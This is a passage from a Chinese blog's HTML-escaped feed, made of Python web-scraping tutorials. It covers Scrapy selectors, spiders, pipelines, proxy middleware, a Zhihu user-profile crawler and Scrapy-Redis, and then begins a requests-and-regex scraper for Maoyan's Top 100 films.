website&apos;       </code></pre><blockquote><p><strong>注意：</strong></p><p>我们还可以将上面的命令简写成 response.css()</p></blockquote><h4 id="2-css-选择器提取属性内容"><a href="#2-css-选择器提取属性内容" class="headerlink" title="(2)css 选择器提取属性内容"></a><strong>(2)css 选择器提取属性内容</strong></h4><p>也可以使用 css 提取 a 标签的属性 href</p><pre><code>In [17]: response.css(&apos;a::attr(href)&apos;).extract()Out[17]: [&apos;image1.html&apos;, &apos;image2.html&apos;, &apos;image3.html&apos;, &apos;image4.html&apos;, &apos;image5.html&apos;]</code></pre><h3 id="3-re-正则"><a href="#3-re-正则" class="headerlink" title="3.re 正则"></a><strong>3.re 正则</strong></h3><p>我们想匹配冒号后面的内容</p><pre><code>In [19]: response.css(&apos;a::text&apos;).re(&apos;Name\\:(.*)&apos;)Out[19]:[&apos; My image 1 &apos;, &apos; My image 2 &apos;, &apos; My image 3 &apos;, &apos; My image 4 &apos;, &apos; My image 5 &apos;]</code></pre><h3 id="4-综合使用"><a href="#4-综合使用" class="headerlink" title="4.综合使用"></a><strong>4.综合使用</strong></h3><pre><code>In [10]:  response.xpath(&apos;//*[@id=&quot;images&quot;]&apos;).css(&apos;img::attr(src)&apos;    ...: ).extract()Out[10]:[&apos;image1_thumb.jpg&apos;, &apos;image2_thumb.jpg&apos;, &apos;image3_thumb.jpg&apos;, &apos;image4_thumb.jpg&apos;, &apos;image5_thumb.jpg&apos;]</code></pre><p>如果是使用 extract_frist() 的话，我们可以设置 default 属性，这样查找不存在的结果的时候就可以使用我们设置的 defalut 来输出</p><pre><code>In [12]:  response.xpath(&apos;//*[@id=&quot;images&quot;]&apos;).css(&apos;img::attr(srcc)    ...: &apos;).extract_first(default=&apos;error&apos;)Out[12]: &apos;error&apos;In [20]: response.css(&apos;a::text&apos;).re_first(&apos;Name\:(.*)&apos;)Out[20]: &apos; My image 1 &apos;</code></pre><h2 id="0X04-scrapy-中-spiders-的用法"><a href="#0X04-scrapy-中-spiders-的用法" class="headerlink" title="0X04 scrapy 中 spiders 的用法"></a><strong>0X04 scrapy 中 spiders 的用法</strong></h2><h3 id="1-spider-的三个属性"><a href="#1-spider-的三个属性" class="headerlink" title="1.spider 的三个属性"></a><strong>1.spider 的三个属性</strong></h3><p>为了创建一个Spider，必须继承 scrapy.Spider 类， 且定义以下两个属性和一个方法:</p><h4 id="1-属性"><a href="#1-属性" class="headerlink" title="(1)属性"></a><strong>(1)属性</strong></h4><p>1.name: 用于区别Spider。 该名字必须是唯一的，您不可以为不同的Spider设定相同的名字。<br>2.allowed_domains：包含允许此爬虫访问的域的可选列表<br>3.start_urls: 包含了Spider在启动时进行爬取的url列表。 因此，第一个被获取到的页面将是其中之一。 后续的URL则从初始的URL获取到的数据中提取。</p><h4 id="2-方法"><a href="#2-方法" class="headerlink" title="(2)方法"></a><strong>(2)方法</strong></h4><p>parse() 是spider的一个默认方法。 </p><p>被调用时，每个初始URL完成下载后生成的 Response 对象将会作为唯一的参数传递给该函数。 该方法负责解析返回的数据(response data)，提取数据(生成item)以及生成需要进一步处理的URL的 Request 对象。</p><p><strong>实例代码：</strong></p><pre><code>import scrapyclass DmozSpider(scrapy.Spider):    name = &quot;dmoz&quot;    allowed_domains = [&quot;dmoz.org&quot;]    start_urls = [        &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Books/&quot;,        &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/&quot;    ]    def parse(self, response):        filename = response.url.split(&quot;/&quot;)[-2]        with open(filename, &apos;wb&apos;) as f:            f.write(response.body)</code></pre><h3 id="1-重写-parse-方法实现自定义的输出结果"><a href="#1-重写-parse-方法实现自定义的输出结果" class="headerlink" title="1.重写 parse 方法实现自定义的输出结果"></a><strong>1.重写 parse 方法实现自定义的输出结果</strong></h3><pre><code>def parse(self, response):    quotes = response.css(&apos;.quote&apos;)    for quote in quotes:        #定义接收对象item        item = QuotetutorialItem()        text = quote.css(&apos;.text::text&apos;).extract_first()        author = quote.css(&apos;.author::text&apos;).extract_first()        tags = quote.css(&apos;.tags .tag::text&apos;).extract()        item[&apos;text&apos;] = text        item[&apos;author&apos;] = author        item[&apos;tags&apos;] = tags        yield item    next = response.css(&apos;.pager .next a::attr(href)&apos;).extract_first()    #拼接下一页的 URL    url = response.urljoin(next)    #使用 scrapy.Request 递归的调用自己实现爬取下一页    yield scrapy.Request(url=url,callback=self.parse)</code></pre><p>可以返回两种类型的结果，一种就是 item ,另一种就是 request 对象实现进一步</p><h3 id="2-重写-start-requests-方法实现-post-请求"><a href="#2-重写-start-requests-方法实现-post-请求" class="headerlink" title="2.重写 start_requests 方法实现 post 请求"></a><strong>2.重写 start_requests 方法实现 post 请求</strong></h3><pre><code>class HttpbinSpider(scrapy.Spider):    name = &apos;httpbin&apos;    allowed_domains = [&apos;www.httpbin.org&apos;]    start_urls = [&apos;http://www.httpbin.org/post&apos;]    #重写 start_requests 改变请求方式    def start_requests(self):        yield scrapy.Request(url=&apos;http://www.httpbin.org/post&apos;,method=&apos;POST&apos;,callback=self.parse_post)    #这里重写了默认的回调函数 parse     def parse_post(self,response):        print(&apos;hello&apos;,response.status)</code></pre><blockquote><p><strong>注意：</strong></p><p>这里还有一个方法是 start_requests() 默认调用的方法<br>make_requests_from_url()，如果我们直接重写这个方法的话，也能实现类似的效果</p></blockquote><h3 id="3-定义-category-实现运行时传入自定义函数"><a href="#3-定义-category-实现运行时传入自定义函数" class="headerlink" title="3.定义 category 实现运行时传入自定义函数"></a><strong>3.定义 category 实现运行时传入自定义函数</strong></h3><pre><code>class HttpbinSpider(scrapy.Spider):    name = &apos;httpbin&apos;    allowed_domains = [&apos;www.httpbin.org&apos;]    start_urls = [&apos;http://www.httpbin.org/post&apos;]    def __init__(self,category=None):        self.category = category    def start_requests(self):        yield scrapy.Request(url=&apos;http://www.httpbin.org/post&apos;,method=&apos;POST&apos;,callback=self.parse_post)    def parse_post(self,response):        print(&apos;hello&apos;,response.status,self.category)</code></pre><p>运行时使用 -a 参数动态传入 category</p><pre><code>scrapy crawl httpbin -a category=picture</code></pre><blockquote><p><strong>注意：</strong></p><p>如果是传入多个参数的话每个参数前需要加 -a</p></blockquote><h2 id="0X05-scrapy-中-item-pipeline-的用法"><a href="#0X05-scrapy-中-item-pipeline-的用法" class="headerlink" title="0X05 scrapy 中 item pipeline 的用法"></a><strong>0X05 scrapy 中 item pipeline 的用法</strong></h2><p>item pipeline 顾名思义就是项目管道，我们在抓取到 item 以后需要对其进行进一步处理，比如数据的清洗、重复检查、数据库存储等</p><h3 id="0-使用的时候需要在-settings-中设置我们配置的-pipeline"><a href="#0-使用的时候需要在-settings-中设置我们配置的-pipeline" class="headerlink" title="0.使用的时候需要在 settings 中设置我们配置的 pipeline"></a><strong>0.使用的时候需要在 settings 中设置我们配置的 pipeline</strong></h3><pre><code>ITEM_PIPELINES = {   &apos;quotetutorial.pipelines.QuotetutorialPipeline&apos;: 300,&apos;quotetutorial.pipelines.MongoPipeline&apos;: 400,}</code></pre><h3 id="1-重写-process-item-实现-item-处理"><a href="#1-重写-process-item-实现-item-处理" class="headerlink" title="1.重写 process_item 实现 item 处理"></a><strong>1.重写 process_item 实现 item 处理</strong></h3><p>最主要是重写 process_item 方法，这个方法是对 Item 进行处理的</p><pre><code>class QuotetutorialPipeline(object):    def __init__(self):        self.limit = 50    def process_item(self, item, spider):        if item[&apos;text&apos;]:            if len(item[&apos;text&apos;]) &gt;  self.limit:                item[&apos;text&apos;] = item[&apos;text&apos;][:self.limit].rstrip() + &apos;...&apos;            return item        else:            # scrapy 特殊的错误处理函数            return DropItem(&apos;Missing Text&apos;)</code></pre><p>返回值是 Item 或者是 DropItem </p><h3 id="2-实现-open-spider-和-close-spider-方法"><a href="#2-实现-open-spider-和-close-spider-方法" class="headerlink" title="2.实现 open_spider 和 close_spider 方法"></a><strong>2.实现 open_spider 和 close_spider 方法</strong></h3><p>这两个是初始化爬虫和关闭爬虫的时候会调用的方法,比如我们可以打开和关闭文件</p><pre><code>import jsonclass JsonWriterPipeline(object):    def open_spider(self, spider):        self.file = open(&apos;items.jl&apos;, &apos;w&apos;)    def close_spider(self, spider):        self.file.close()    def process_item(self, item, spider):        line = json.dumps(dict(item)) + &quot;\n&quot;        self.file.write(line)        return item</code></pre><h3 id="3-重写-from-crawler-实现读取配置文件中的配置"><a href="#3-重写-from-crawler-实现读取配置文件中的配置" class="headerlink" title="3.重写 from_crawler 实现读取配置文件中的配置"></a><strong>3.重写 from_crawler 实现读取配置文件中的配置</strong></h3><pre><code>class MongoPipeline(object):    def __init__(self,mongo_url,mongo_db):        self.mongo_url = mongo_url        self.mongo_db = mongo_db    #这个内置函数能从 settings 里面拿到想要的配置信息    @classmethod    def from_crawler(cls,crawler):        return cls(            mongo_url = crawler.settings.get(&apos;MONGO_URL&apos;),            mongo_db = crawler.settings.get(&apos;MONGO_DB&apos;)        )    #这个方法是爬虫初始化的时候会执行的方法    def open_spider(self,spider):        self.client = pymongo.MongoClient(self.mongo_url)        self.db = self.client[self.mongo_db]    #重写该方法实现对数据的数据库存储    def process_item(self,item,spider):        name = item.__class__.__name__        self.db[name].insert(dict(item))        return item    def close_spider(self,spider):        self.client.close()</code></pre><h2 id="0X06-scrapy-中-Download-MiddleWare-下载中间件-的使用"><a href="#0X06-scrapy-中-Download-MiddleWare-下载中间件-的使用" class="headerlink" title="0X06 scrapy 中 Download MiddleWare(下载中间件) 的使用"></a><strong>0X06 scrapy 中 Download MiddleWare(下载中间件) 的使用</strong></h2><h3 id="1-基本介绍"><a href="#1-基本介绍" class="headerlink" title="1.基本介绍"></a><strong>1.基本介绍</strong></h3><p>先来看一下下载中间件在全局架构中的位置：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8714.png" alt="此处输入图片的描述"></p><p>可以明显的看到其在 request 和 response 的过程中起到了一个拦截和修改的作用，但是其实它有三个方法</p><p>(1)处理请求：process_request(request, spider)<br>(2)处理响应：process_response(request, response, spider)<br>(3)处理异常：process_exception(request, exception, spider)</p><h3 id="2-拦截-request-并修改"><a href="#2-拦截-request-并修改" class="headerlink" title="2.拦截 request 并修改"></a><strong>2.拦截 request 并修改</strong></h3><p>我们访问 httpbin.org 可以查看到我们的访问的 IP , 我们可以使用 下载中间件拦截我们的请求实现 IP 地址的伪造</p><p><strong>middlewares.py</strong></p><pre><code>class ProxyMiddleware(object):    logger = logging.getLogger(__name__)    def process_request(self,request,spider):        self.logger.debug(&apos;Using proxy&apos;)        request.meta[&apos;proxy&apos;] = &apos;http://127.0.0.1:1080&apos;</code></pre><p>然后我们在 settings 中进行设置</p><p><strong>settings.py</strong>    </p><pre><code>DOWNLOADER_MIDDLEWARES = {   &apos;quotetutorial.middlewares.ProxyMiddleware&apos;: 443,}</code></pre><h3 id="3-拦截-response-并修改"><a href="#3-拦截-response-并修改" class="headerlink" title="3.拦截 response 并修改"></a><strong>3.拦截 response 并修改</strong></h3><pre><code>class ProxyMiddleware(object):    logger = logging.getLogger(__name__)    def process_request(self,request,spider):        self.logger.debug(&apos;Using proxy&apos;)        request.meta[&apos;proxy&apos;] = &apos;http://127.0.0.1:1080&apos;    def process_response(self,spider,request,response):        response.status = 204        return response</code></pre><h3 id="4-拦截异常并处理"><a href="#4-拦截异常并处理" class="headerlink" title="4.拦截异常并处理"></a><strong>4.拦截异常并处理</strong></h3><p><strong>google.py</strong> </p><pre><code>class GoogleSpider(scrapy.Spider):    name = &apos;google&apos;    allowed_domains = [&apos;www.google.com&apos;]    start_urls = [&apos;http://www.google.com/&apos;]    #设置请求的超时时间为 10s ,超时会抛出异常    def make_requests_from_url(self, url):        self.logger.debug(&apos;Try First Time&apos;)        return scrapy.Request(url=url,meta={&apos;download_timeout&apos;:10},callback=self.parse,dont_filter=True)    def parse(self, response):        print(response.text)</code></pre><p><strong>middlewares.py</strong></p><pre><code>class ProxyMiddleware(object):    logger = logging.getLogger(__name__)    def process_exception(self,request,exception,spider):        self.logger.debug(&apos;Get Exception&apos;)        self.logger.debug(&apos;Try Second Time&apos;)        request.meta[&apos;proxy&apos;] = &apos;http://127.0.0.1:1080&apos;        return request</code></pre><h3 id="5-其他"><a href="#5-其他" class="headerlink" title="5.其他"></a><strong>5.其他</strong></h3><p>运行代码的时候你可能会发现，在调试信息中会出现很多我们没有定义过得 Middleware ，这实际上是系统自己设置的，我们可以通过下面的命令获取这些内置的middleware </p><pre><code>scrapy settings --get=DOWNLOADER_MIDDLEWARES_BASE  </code></pre><p>如果我们不想使用这些 middleware 我们可以在 settings 中将其置位 None</p><pre><code>λ scrapy settings --get=DOWNLOADER_MIDDLEWARES_BASE{&quot;scrapy.downloadermiddlewares.robotstxt.RobotsTxtMiddleware&quot;: 100, &quot;scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware&quot;: 300, &quot;scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware&quot;: 350, &quot;scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware&quot;: 400, &quot;scrapy.downloadermiddlewares.useragent.UserAgentMiddleware&quot;: 500, &quot;scrapy.downloadermiddlewares.retry.RetryMiddleware&quot;: 550, &quot;scrapy.downloadermiddlewares.ajaxcrawl.AjaxCrawlMiddleware&quot;: 560, &quot;scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware&quot;: 580, &quot;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&quot;: 590, &quot;scrapy.downloadermiddlewares.redirect.RedirectMiddleware&quot;: 600, &quot;scrapy.downloadermiddlewares.cookies.CookiesMiddleware&quot;: 700, &quot;scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware&quot;: 750, &quot;scrapy.downloadermiddlewares.stats.DownloaderStats&quot;: 850, &quot;scrapy.downloadermiddlewares.httpcache.HttpCacheMiddleware&quot;: 900}</code></pre><h2 id="0X07-Scrapy爬取知乎用户信息实战"><a href="#0X07-Scrapy爬取知乎用户信息实战" class="headerlink" title="0X07 Scrapy爬取知乎用户信息实战"></a><strong>0X07 Scrapy爬取知乎用户信息实战</strong></h2><h3 id="1-分析爬取信息确定思路"><a href="#1-分析爬取信息确定思路" class="headerlink" title="1.分析爬取信息确定思路"></a><strong>1.分析爬取信息确定思路</strong></h3><p>只要用户不是 0关注0粉丝，那么我们就能对与用户关联的人进行递归抓取，这样就能获得源源不断的信息，以轮子哥的知乎为例，我们从控制台看一下他关注的人的信息是怎么加载的，除了第一页是通过在页面中的 json 数据进行的初始化以外，其他几页可以看到是通过 XHR 请求获取的 json 数据，然后是对于每一个用户来讲信息来自于用户信息页面本身的 json 数据</p><p><strong>思路梳理：</strong></p><p>(1)选定一个关注数或者粉丝数比较多的大 V 作为我们爬取的起点<br>(2)通过知乎的接口获取大 V 的关注列表和粉丝列表<br>(3)通过知乎的接口获取关注列表和粉丝列表中用户的信息<br>(4)对这些用户递归调用爬取其关注列表和粉丝列表</p><h3 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2.代码实现"></a><strong>2.代码实现</strong></h3><p><strong>zhihu.py</strong></p><pre><code>class ZhihuSpider(scrapy.Spider):    name = &apos;zhihu&apos;    allowed_domains = [&apos;www.zhihu.com&apos;]    start_urls = [&apos;http://www.zhihu.com/&apos;]    #设置开始用户    start_user = &apos;Talyer-Wei&apos;    #设置查看用户信息的 URL    user_url = &apos;https://www.zhihu.com/api/v4/members/{user}?include={include}&apos;    user_query = &apos;allow_message,is_followed,is_following,is_org,is_blocking,employments,answer_count,follower_count,articles_count,gender,badge[?(type=best_answerer)].topics&apos;    #设置查看关注着信息的 URL    followee_url = &apos;https://www.zhihu.com/api/v4/members/{user}/followees?include={include}&amp;offset={offset}&amp;limit={limit}&apos;    followee_query = &apos;data[*].answer_count,articles_count,gender,follower_count,is_followed,is_following,badge[?(type=best_answerer)].topics&apos;    def start_requests(self):        #url = &apos;https://www.zhihu.com/api/v4/members/xu-zhou-yang-52?include=allow_message%2Cis_followed%2Cis_following%2Cis_org%2Cis_blocking%2Cemployments%2Canswer_count%2Cfollower_count%2Carticles_count%2Cgender%2Cbadge%5B%3F(type%3Dbest_answerer)%5D.topics&apos;        #url = &apos;https://www.zhihu.com/api/v4/members/Talyer-Wei/followees?include=data%5B*%5D.answer_count%2Carticles_count%2Cgender%2Cfollower_count%2Cis_followed%2Cis_following%2Cbadge%5B%3F(type%3Dbest_answerer)%5D.topics&amp;offset=0&amp;limit=20&apos;        #分别请求初始用户的信息和他关注的用户列表        yield Request(self.user_url.format(user=self.start_user,include=self.user_query),self.parse_user)        yield Request(self.followee_url.format(user=self.start_user,include=self.followee_query,offset=0,limit=20),self.parse_followee)    def parse_user(self, response):        #用请求得到的 json 给我们的 field 赋值        result = json.loads(response.text)        item = UserItem()        for field in item.fields:            if field in result.keys():                item[field] = result.get(field)        yield item        yield Request(self.followee_url.format(user=result.get(&apos;url_token&apos;),include=self.followee_query,limit=20,offset=0),self.parse_followee)    def parse_followee(self,response):        #解析出每一个 followee 的用户 url_token        results = json.loads(response.text)        if &apos;data&apos; in results.keys():            for result in results.get(&apos;data&apos;):                yield Request(self.user_url.format(user=result.get(&apos;url_token&apos;),include=self.user_query),self.parse_user)        if &apos;paging&apos; in results.keys() and results.get(&apos;paging&apos;).get(&apos;is_end&apos;) == False:            next_page = results.get(&apos;paging&apos;).get(&apos;next&apos;)            yield Request(next_page,self.parse_followee)</code></pre><p><strong>item.py</strong></p><pre><code>from scrapy import Item,Fieldclass UserItem(Item):    # define the fields for your item here like:    # name = scrapy.Field()    id = Field()    name = Field()    headline = Field()    url = Field()    url_token = Field()    answer_count = Field()    articles_count = Field()    avatar_url = Field()    follower_count = Field()</code></pre><p><strong>pipelines.py</strong></p><pre><code>import pymongoclass MongoPipeline(object):    collection_name = &apos;scrapy_items&apos;    def __init__(self, mongo_uri, mongo_db):        self.mongo_uri = mongo_uri        self.mongo_db = mongo_db    @classmethod    def from_crawler(cls, crawler):        return cls(            mongo_uri=crawler.settings.get(&apos;MONGO_URI&apos;),            mongo_db=crawler.settings.get(&apos;MONGO_DATABASE&apos;)        )    def open_spider(self, spider):        self.client = pymongo.MongoClient(self.mongo_uri)        self.db = self.client[self.mongo_db]    def close_spider(self, spider):        self.client.close()    def process_item(self, item, spider):        #self.db[self.collection_name].insert_one(dict(item))        self.db[&apos;user&apos;].update({&apos;url_token&apos;:item[&apos;url_token&apos;]},{&apos;$set&apos;:item},True )        return item</code></pre><blockquote><p><strong>注意：</strong></p><p>settings 中还要配置 UA  以及数据库的一些常量，这里就不在多写了</p></blockquote><h2 id="0X08-Scrapy分布式原理及Scrapy-Redis源码解析"><a href="#0X08-Scrapy分布式原理及Scrapy-Redis源码解析" class="headerlink" title="0X08 Scrapy分布式原理及Scrapy-Redis源码解析"></a><strong>0X08 Scrapy分布式原理及Scrapy-Redis源码解析</strong></h2><h3 id="1-单机-Scrapy-架构和分布式对比"><a href="#1-单机-Scrapy-架构和分布式对比" class="headerlink" title="1.单机 Scrapy 架构和分布式对比"></a><strong>1.单机 Scrapy 架构和分布式对比</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8714.png" alt="此处输入图片的描述"></p><p>具体的步骤是  scrapy 引擎通过调度器调度一个队列，发出 requests 请求给 downloader 然后请求网络，但是这个队列都是本机的队列，因此如果要做多台主机的协同的爬取的话，每台主机自己的队列是不能满足我们的需要的，那我们就要将这个队列做成统一的可访问的队列(<strong>共享爬取队列</strong>)，每次调用 requests 的时候都是统一调用这个队列，进行统一的存取操作</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8715.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8716.png" alt="此处输入图片的描述"></p><h3 id="2-队列使用什么维护"><a href="#2-队列使用什么维护" class="headerlink" title="2.队列使用什么维护"></a><strong>2.队列使用什么维护</strong></h3><p>推荐使用 Redis 作为我们的维护队列,原因有一下三点</p><p>(1)非关系型数据库，key-value 存储结构灵活<br>(2)内存中的数据结构存储系统，性能好<br>(3)提供队列，集合等多种存储结构方便队列维护</p><h3 id="3-队列如何去重"><a href="#3-队列如何去重" class="headerlink" title="3.队列如何去重"></a><strong>3.队列如何去重</strong></h3><p>使用 redis 的集合数据结构，向集合中加入 requests 的指纹，每一个 requests 加入集合前先验证指纹存不存在集合中，如果存在则不进行加入</p><h3 id="4-架构的实现"><a href="#4-架构的实现" class="headerlink" title="4.架构的实现"></a><strong>4.架构的实现</strong></h3><p>实际上存在 Scrapy-Redis 这个库，这个库帮我们完美的实现了这个架构，包括调度器、队列、去重等一应俱全</p><p><strong>项目地址：</strong><a href="https://github.com/rmax/scrapy-redis" target="_blank" rel="noopener">https://github.com/rmax/scrapy-redis</a></p><h3 id="5-实际的使用"><a href="#5-实际的使用" class="headerlink" title="5.实际的使用"></a><strong>5.实际的使用</strong></h3><p>我们可以将配置好的代码上传到我们的 git 仓库，然后每一台主机去克隆运行</p><p>在太多主机的情况下如果觉得这种方式不是很方便的话，github 还有一个 scrapyd 的项目，可以帮助我们部署</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X00-scrapy-的安装与使用&quot;&gt;&lt;a href=&quot;#0X00-scrapy-的安装与使用&quot; class=&quot;headerlink&quot; title=&quot;0X00 scrapy 的安装与使用&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X00 scrapy 的安装与使用&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-windows-下-scrapy-的安装&quot;&gt;&lt;a href=&quot;#1-windows-下-scrapy-的安装&quot; class=&quot;headerlink&quot; title=&quot;1.windows 下 scrapy 的安装&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.windows 下 scrapy 的安装&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;windows 下的安装首先需要安装一些依赖库，有些最好使用下载 whl 文件进行本地安装的方法，下面是安装步骤和一些需要本地安装的依赖库&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.wheel&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pip3 install wheel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;2.lxml&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://www.lfd.uci.edu/~gohlke/pythonlibs/#lxml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;3.PyOpenssl&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://pypi.python.org/pypi/pyOpenSSL#downloads
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;4.Twisted&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;5.Pywin32&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://pypi.org/project/pywin32/#files
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;6.Scrapy&lt;/strong&gt; &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pip3 install scrapy
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;2-scrapy-的基本运行测试&quot;&gt;&lt;a href=&quot;#2-scrapy-的基本运行测试&quot; class=&quot;headerlink&quot; title=&quot;2.scrapy 的基本运行测试&quot;&gt;&lt;/a&gt;&lt;strong&gt;2.scrapy 的基本运行测试&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;按照下图的步骤输入，如果最后没有报错就说明安装成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%871.png&quot; alt=&quot;此处输入图片的描述&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="备忘" scheme="https://www.k0rz3n.com/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="爬虫" scheme="https://www.k0rz3n.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>Python3 爬虫知识梳理(实战篇)</title>
    <link href="https://www.k0rz3n.com/2019/05/07/python3%20%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86(%E5%AE%9E%E6%88%98%E7%AF%87)/"/>
    <id>https://www.k0rz3n.com/2019/05/07/python3 爬虫知识梳理(实战篇)/</id>
    <published>2019-05-07T07:59:18.000Z</published>
    <updated>2019-05-07T07:59:12.423Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X01-Requests-正则爬取网页数据"><a href="#0X01-Requests-正则爬取网页数据" class="headerlink" title="0X01 Requests+正则爬取网页数据"></a><strong>0X01 Requests+正则爬取网页数据</strong></h2><h3 id="1-分析网页确定思路"><a href="#1-分析网页确定思路" class="headerlink" title="1.分析网页确定思路"></a><strong>1.分析网页确定思路</strong></h3><p>这一节打算爬取猫眼电影的 top 100 的电影信息，我们首先可以访问一下我们需要爬取的网站，看一下我们需要的信息所处的位置和结构如何</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%981_.png" alt="此处输入图片的描述"></p><p>看完以后我们的思路应该就比较清晰了，我们首先使用 requests 库请求单页内容，然后我们使用正则对我们需要的信息进行匹配，然后将我们需要的每一条信息保存成一个JSON 字符串，并将其存入文件当中，然后就是开启循环遍历十页的内容或者采用 Python 多线程的方式提高爬取速度</p><a id="more"></a><h3 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2.代码实现"></a><strong>2.代码实现</strong></h3><p><strong>spider.py</strong></p><pre><code>import requestsimport jsonfrom requests.exceptions import RequestExceptionimport refrom multiprocessing import Poolrequests.packages.urllib3.disable_warnings()def get_one_page(url):    try:        headers = {            &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&apos;,        }        res = requests.get(url,headers=headers,verify=False)        if res.status_code == 200:            return res.text        return None    except RequestException:        return Nonedef parse_one_page(html):    pattern = re.compile(&apos;&lt;dd&gt;.*?board-index.*?(\d+)&lt;/i&gt;.*?data-src=&quot;(.*?)&quot;.*?alt=&quot;(\w+)&quot;.*?&quot;star&quot;&gt;&apos;                         &apos;(.*?)&lt;/p&gt;.*?&quot;releasetime&quot;&gt;(.*?)&lt;/p&gt;.*?integer&quot;&gt;(.*?)&lt;/i&gt;.*?fraction&quot;&gt;(\d)&lt;/i&gt;&apos;,re.S)    items = re.findall(pattern,html)    for item in items:        #这里使用 yield 将该函数变成了一个可迭代对象并且每次能返回自己定义好格式的数据        yield {            &apos;index&apos;: item[0],            &apos;image&apos;: item[1],            &apos;name&apos;: item[2],            &apos;actor&apos;:item[3].strip()[3:],            &apos;time&apos;: item[4].strip()[5:],            &apos;score&apos;: item[5]+item[6]        }def write_to_file(content):    with open(&apos;result.txt&apos;,&apos;a&apos;,encoding=&apos;utf-8&apos;) as f:        f.write(json.dumps(content,ensure_ascii=False) + &apos;\n&apos; )def main(offset):    url = &quot;http://maoyan.com/board/4?offset=&quot; + str(offset)    html = get_one_page(url)    for item in parse_one_page(html):        write_to_file(item)if __name__ == &apos;__main__&apos;:    pool = Pool()    pool.map(main,[i*10 for i in range(10)])</code></pre><h3 id="3-运行效果"><a href="#3-运行效果" class="headerlink" title="3.运行效果"></a><strong>3.运行效果</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%986.png" alt="此处输入图片的描述"></p><h2 id="0X02-模拟-Ajax-请求抓取今日头条街拍美图"><a href="#0X02-模拟-Ajax-请求抓取今日头条街拍美图" class="headerlink" title="0X02 模拟 Ajax 请求抓取今日头条街拍美图"></a><strong>0X02 模拟 Ajax 请求抓取今日头条街拍美图</strong></h2><h3 id="1-分析网页确定思路-1"><a href="#1-分析网页确定思路-1" class="headerlink" title="1.分析网页确定思路"></a><strong>1.分析网页确定思路</strong></h3><p>首先我们打开头条街拍的页面，我们发现我们看到的详细页链接直接在源代码中并不能找到，于是我们就需要去查看我们的 ajax 请求，看看是不是通过 ajax 加载的，我们可以打开浏览器控制台，我们过滤 XHR 请求有了一些发现，如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%982.png" alt="此处输入图片的描述"></p><p>在 xhr 请求中 offset 为 0 的部分，页面中的 data 为 0 的 数据部分清楚地地显示了我们想要查找的详细页的数据，然后随着我们滚动条的下拉，页面会不断发起 xhr 请求，offset 会随之不断的增大，每次增大的数目为 10 ，实际上是通过 ajax 去请求索引页，每次返回的 json 结果中有10条详细页的数据，这样我们就能不断在页面中获取到街拍新闻的信息。</p><p>有了街拍新闻，自然我们还要进入新闻中获取街拍的美图，我们看一下新闻内部的图片是怎么获取的，如下图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%983_.png" alt="此处输入图片的描述"></p><p><img 